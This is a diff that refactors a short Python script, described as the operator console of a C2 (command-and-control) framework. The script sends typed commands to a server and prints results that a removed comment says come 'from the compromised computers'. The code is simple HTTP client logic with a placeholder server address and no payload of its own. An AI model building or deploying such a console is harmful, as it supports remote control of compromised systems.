@@ -1,24 +1,28 @@
 ## Simple command-line user interface for a C2 framework
 
+"""Simple command-line user interface for the C2 framework."""
+
+import os
 import requests
 
+SERVER_URL = os.getenv('SERVER_URL', 'http://server_url')
+
 def send_command(command):
-    # Send the command to the server using an HTTP POST request
-    requests.post('http://server_url/run_command', json={'command': command})
+    """Send a command to the server."""
+    requests.post(f"{SERVER_URL}/run_command", json={'command': command})
 
 def view_output():
-    # Ask the server for the output of the most recent command
-    output = requests.get('http://server_url/command_output')
+    """Retrieve and display the output from the server."""
+    response = requests.get(f"{SERVER_URL}/command_output")
+    print(response.text)
 
-    # Print the output to the command line
-    print(output)
+def main():
+    """Run the simple text-based UI loop."""
+    while True:
+        command = input('Enter a command: ')
+        send_command(command)
+        view_output()
 
-while True:
-    # Prompt the user for a command
-    command = input('Enter a command: ')
 
-    # Send the command to the server
-    send_command(command)
-
-    # View the output from the compromised computers
-    view_output()
+if __name__ == '__main__':
+    main()
